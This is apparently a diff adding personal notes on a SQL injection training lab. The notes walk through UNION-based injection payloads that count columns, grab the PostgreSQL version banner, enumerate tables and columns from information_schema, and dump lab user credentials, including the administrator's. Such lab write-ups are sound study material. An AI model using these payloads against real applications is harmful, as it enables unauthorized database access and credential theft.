@@ -1,0 +1,53 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category
+2. app has login function
+3. db has table that stores username and password
+4. non-oracle db
+
+GOAL
+1. retreive the cols and tables
+2. login as administrator
+
+PREREQUISITE
+1. db types have set of views called information schema which provide info about database
+    like tables, cols etc ( (-) oracle)
+    a) to list tables , query from information_schema.tables 
+        TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+        =====================================================
+        MyDatabase dbo Products BASE TABLE
+        MyDatabase dbo Users BASE TABLE
+        MyDatabase dbo Feedback BASE TABLE 
+    
+    b) to list cols , query from information_schema.columns 
+
+ANALYSIS
+
+1. get no of col
+
+    a) '+order+by+1--
+        <ok>
+    b) '+order+by+2--
+        <ok>
+    c) '+order+by+3--
+        <internal server error>
+    no of col = 2
+2. determine data type
+3. grabbing the banner
+' UNION SELECT version(), NULL 
+PostgreSQL 11.14 (Debian 11.14-1.pgdg90+1) on x86_64-pc-linux-gnu,
+compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
+
+4. list all tables
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+users_admevp
+users_xcgonl
+5. list all col in users_admevp
+    a) ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_admevp'--
+        password_mcmaey
+        username_lilyty
+        got 2 cols
+4. get username and password
+
+        administrator: ycoe1r68l4zt8faufp84
+        wiener: hz247kufzxt8oj2o6ymb
+        carlos: mv977k7tjqh4msuy0ucw
